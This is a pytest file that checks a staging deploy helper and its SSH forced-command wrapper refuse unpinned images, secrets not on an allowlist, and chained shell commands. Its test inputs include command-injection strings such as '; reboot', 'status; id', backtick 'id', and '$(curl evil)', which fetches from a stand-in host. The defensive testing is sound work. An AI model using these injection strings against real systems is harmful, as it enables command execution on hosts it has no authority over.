"""The staging deploy key can do exactly what the deploy helper allows.

Why: CI reaches the staging host with one SSH key. Its forced command and the
root helper behind sudo are the only authority it has, so a malformed image
reference must change nothing on the host, and a command that tries to chain
a shell command must be refused before sudo runs. The end-to-end behaviour
(deploy, automatic rollback, backup, restore) is rehearsed on a real host in
.github/workflows/staging-rehearsal.yml.
"""
from __future__ import annotations

import importlib.machinery
import importlib.util
import json
import os
import subprocess
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
HELPER = ROOT / "deploy" / "staging" / "omnidesk-deploy-compose"
ENTRY = ROOT / "deploy" / "staging" / "omnidesk-ssh-entry"


def _load_helper(tmp_path: Path, monkeypatch):
    monkeypatch.setenv("OMNIDESK_STAGING_STATE_DIR", str(tmp_path / "state"))
    monkeypatch.setenv("OMNIDESK_STAGING_COMPOSE_DIR", str(tmp_path / "compose"))
    monkeypatch.setenv("OMNIDESK_STAGING_DEPLOY_HISTORY", str(tmp_path / "history.jsonl"))
    monkeypatch.setenv("OMNIDESK_STAGING_ALLOW_NON_ROOT", "1")
    loader = importlib.machinery.SourceFileLoader("omnidesk_deploy_compose", str(HELPER))
    spec = importlib.util.spec_from_loader(loader.name, loader)
    module = importlib.util.module_from_spec(spec)
    loader.exec_module(module)
    return module


@pytest.mark.parametrize(
    "image",
    [
        "ghcr.io/omniorganization/omni-desk-ai/omnidesk-agent:latest",  # a tag, not a digest
        "ghcr.io/x/y@sha256:" + "a" * 63,  # truncated digest
        "ghcr.io/x/y@sha256:" + "a" * 64 + ";reboot",
        "--privileged",
    ],
)
def test_deploy_refuses_unpinned_or_malformed_images_without_touching_docker(tmp_path, monkeypatch, capsys, image):
    helper = _load_helper(tmp_path, monkeypatch)
    calls: list[list[str]] = []
    monkeypatch.setattr(helper.subprocess, "run", lambda argv, **kw: calls.append(argv) or subprocess.CompletedProcess(argv, 0, "", ""))
    assert helper.main(["deploy", f"--image={image}", "--expected-version", "1.0"]) == 3
    assert calls == []
    assert json.loads(capsys.readouterr().out.strip().splitlines()[-1])["status"] == "refused"


def test_failed_pull_changes_nothing_and_keeps_the_running_release(tmp_path, monkeypatch, capsys):
    helper = _load_helper(tmp_path, monkeypatch)
    state = tmp_path / "state"
    state.mkdir()
    (state / "release.env").write_text("OMNIDESK_IMAGE=r@sha256:" + "b" * 64 + "\n", encoding="utf-8")
    calls: list[list[str]] = []

    def fake_run(argv, **kwargs):
        calls.append(argv)
        return subprocess.CompletedProcess(argv, 1, "", "manifest unknown")

    monkeypatch.setattr(helper.subprocess, "run", fake_run)
    image = "r@sha256:" + "c" * 64
    assert helper.main(["deploy", "--image", image, "--expected-version", "1.0"]) == 3
    assert calls == [["docker", "pull", image]]
    assert (state / "release.env").read_text(encoding="utf-8") == "OMNIDESK_IMAGE=r@sha256:" + "b" * 64 + "\n"
    assert "image pull failed" in capsys.readouterr().out


def test_only_allowlisted_secrets_can_be_provisioned(tmp_path, monkeypatch, capsys):
    helper = _load_helper(tmp_path, monkeypatch)
    monkeypatch.setattr("sys.stdin", __import__("io").StringIO("x" * 40))
    assert helper.main(["provision-secret", "omnidesk-admin-token"]) == 3
    assert "unknown secret name" in capsys.readouterr().out


def _run_entry(tmp_path: Path, command: str) -> subprocess.CompletedProcess:
    fake_bin = tmp_path / "bin"
    fake_bin.mkdir(exist_ok=True)
    (fake_bin / "sudo").write_text('#!/bin/sh\necho "SUDO $*"\n', encoding="utf-8")
    (fake_bin / "logger").write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    for name in ("sudo", "logger"):
        os.chmod(fake_bin / name, 0o755)
    env = {"PATH": f"{fake_bin}:/usr/bin:/bin", "SSH_ORIGINAL_COMMAND": command}
    return subprocess.run(["bash", str(ENTRY)], env=env, capture_output=True, text=True, check=False)


@pytest.mark.parametrize(
    "command",
    [
        "omnidesk-deploy-compose status; id",
        "omnidesk-deploy-compose deploy --image $(curl evil)",
        "omnidesk-deploy-compose deploy --image `id`",
        "bash -c id",
        "omnidesk-deploy-compose shell",
        "",
    ],
)
def test_forced_command_refuses_anything_but_helper_subcommands(tmp_path, command):
    result = _run_entry(tmp_path, command)
    assert result.returncode == 3
    assert "SUDO" not in result.stdout
    assert json.loads(result.stdout)["status"] == "refused"


def test_forced_command_runs_the_helper_through_sudo_only(tmp_path):
    image = "ghcr.io/o/r@sha256:" + "d" * 64
    result = _run_entry(tmp_path, f"omnidesk-deploy-compose deploy --image {image} --expected-version 1.12.7+ci")
    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == f"SUDO -n /usr/local/bin/omnidesk-deploy-compose deploy --image {image} --expected-version 1.12.7+ci"
